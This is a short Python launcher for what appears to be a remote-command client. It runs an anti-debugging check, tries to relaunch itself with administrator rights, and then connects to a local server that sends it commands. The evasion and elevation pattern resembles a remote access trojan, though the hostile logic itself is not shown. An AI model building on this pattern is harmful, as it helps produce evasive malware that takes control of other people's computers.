from client.client import Client
from client.handlers import CommandHandler
from modules import antidb
from common import utils
import asyncio

def main() -> None:
    antidb.AntiDebug()

    # Ensure the script runs with elevated permissions
    if not utils.isUserAdmin():
        try:
            utils.runAsAdmin()
        except PermissionError:
            pass

    # Start the client
    server_address = ('localhost', 5174)
    command_handler = CommandHandler()
    client = Client(server_address, command_handler)
    asyncio.run(client.run())

if __name__ == "__main__":
    main()
